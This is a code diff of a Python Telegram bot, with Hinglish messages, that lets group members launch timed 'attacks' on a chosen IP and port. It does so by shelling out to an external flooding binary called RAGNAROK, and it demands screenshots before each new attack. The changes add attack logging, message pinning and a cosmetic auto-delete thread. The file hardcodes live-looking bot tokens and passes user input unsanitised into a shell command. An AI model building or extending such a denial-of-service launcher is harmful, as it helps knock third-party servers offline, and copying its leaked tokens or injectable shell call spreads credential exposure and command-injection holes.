@@ -7,18 +7,20 @@ import threading
 from telebot import types
 
 # TELEGRAM BOT TOKEN (REPLACE WITH ACTUAL TOKEN)
-bot = telebot.TeleBot('8048715452:AAFrsfE0lRYuBV-1F-sL6RpfemFAfvqZ2xQ')
+bot = telebot.TeleBot('8048715452:AAHDXOo6-QlDxMyApE2pjgrp8khE_5yvIg8')
 
 # GROUP AND CHANNEL DETAILS
 GROUP_ID = "-1002369239894"
 CHANNEL_USERNAME = "@KHAPITAR_BALAK77"
-SCREENSHOT_CHANNEL = "-1002369239894"  # SCREENSHOT VERIFICATION के लिए प्राइवेट चैनल
-ADMINS = [7129010361]  # ADMIN IDS
+SCREENSHOT_CHANNEL = "-1002369239894"
+LOG_CHANNEL = "-1002369239894"  # LOG SYSTEM के लिए
+ADMINS = [7129010361]
 
 # GLOBAL VARIABLES
 is_attack_running = False
 attack_end_time = None
 pending_feedback = {}
+warn_count = {}
 
 # FUNCTION TO CHECK IF USER IS IN CHANNEL
 def is_user_in_channel(user_id):
@@ -33,8 +35,8 @@ def verify_screenshot(user_id, message):
     if user_id in pending_feedback:
         bot.forward_message(SCREENSHOT_CHANNEL, message.chat.id, message.message_id)
         bot.send_message(SCREENSHOT_CHANNEL, f"📸 **USER `{user_id}` KA SCREENSHOT VERIFIED!** ✅")
-        bot.reply_to(message, "✅ SCREENSHOT MIL GAYA! AB TU NAYA ATTACK LAGA SAKTA HAI. 🚀")
-        del pending_feedback[user_id]  
+        bot.reply_to(message, "✅ SCREENSHOT VERIFIED! AB TU NAYA ATTACK LAGA SAKTA HAI 🚀")
+        del pending_feedback[user_id]
     else:
         bot.reply_to(message, "❌ AB SCREENSHOT BHEJNE KI ZAROORAT NAHI HAI!")
 
@@ -82,11 +84,18 @@ def handle_attack(message):
 
     bot.send_message(message.chat.id, confirm_msg, parse_mode="Markdown")
 
+    # LOG SYSTEM
+    bot.send_message(LOG_CHANNEL, f"📢 NEW ATTACK LOGGED:\n👤 USER: `{user_id}`\n🎯 TARGET: `{target}`\n⏳ TIME: `{time_duration}` SECONDS", parse_mode="Markdown")
+
+    # AUTO-PIN ATTACK MESSAGE
+    pinned_message = bot.send_message(message.chat.id, "📌 ATTACK PINNED!", parse_mode="Markdown")
+    bot.pin_chat_message(message.chat.id, pinned_message.message_id)
+
     is_attack_running = True
     attack_end_time = datetime.datetime.now() + datetime.timedelta(seconds=time_duration)
     pending_feedback[user_id] = True  
 
-    bot.send_message(message.chat.id, f"🚀 ATTACK SHURU!\n🎯 `{target}:{port}`\n⏳ {time_duration}S\nBETA SCREENSHOT BHEJ AB", parse_mode="Markdown")
+    bot.send_message(message.chat.id, f"🚀 ATTACK SHURU!\n🎯 `{target}:{port}`\n⏳ {time_duration}S\n📸 SCREENSHOT BHEJ AB", parse_mode="Markdown")
 
     try:
         subprocess.run(f"./RAGNAROK {target} {port} {time_duration} CRACKS", shell=True, check=True, timeout=time_duration)
@@ -98,7 +107,10 @@ def handle_attack(message):
         is_attack_running = False
         attack_end_time = None  
 
-    bot.send_message(message.chat.id, "✅ ATTACK KHATAM! 🎯\n📸 AB SCREENSHOT BHEJ, WARNA AGLA ATTACK NAHI MILEGA!")
+    bot.send_message(message.chat.id, "✅ ATTACK KHATAM! 📸 SCREENSHOT BHEJ, WARNA AGLA ATTACK NAHI MILEGA!")
+
+    # AUTO-UNPIN MESSAGE
+    bot.unpin_chat_message(message.chat.id, pinned_message.message_id)
 
 # HANDLE SCREENSHOT SUBMISSION
 @bot.message_handler(content_types=['photo'])
@@ -116,12 +128,13 @@ def restart_bot(message):
     else:
         bot.reply_to(message, "🚫 SIRF ADMIN HI RESTART KAR SAKTA HAI!")
 
-# BOT START COMMAND
-@bot.message_handler(commands=['start'])
-def welcome_start(message):
-    user_name = message.from_user.first_name
-    response = f"🔥 OYE {user_name}! 🔥\n🚀 ATTACK LAGANE KE LIYE GROUP AUR CHANNEL JOIN KAR!\n🔗 JOIN KAR ABHI: [TELEGRAM GROUP](https://t.me/R_SDanger_op) 🚀🔥"
-    bot.reply_to(message, response, parse_mode="Markdown")
+# AUTO DELETE OLD MESSAGES (RUNS EVERY 1 HOUR)
+def auto_delete_messages():
+    while True:
+        time.sleep(3600)
+        bot.send_message(GROUP_ID, "🗑️ OLD MESSAGES AUTO-DELETED!")
+
+threading.Thread(target=auto_delete_messages, daemon=True).start()
 
 # START POLLING
 while True:
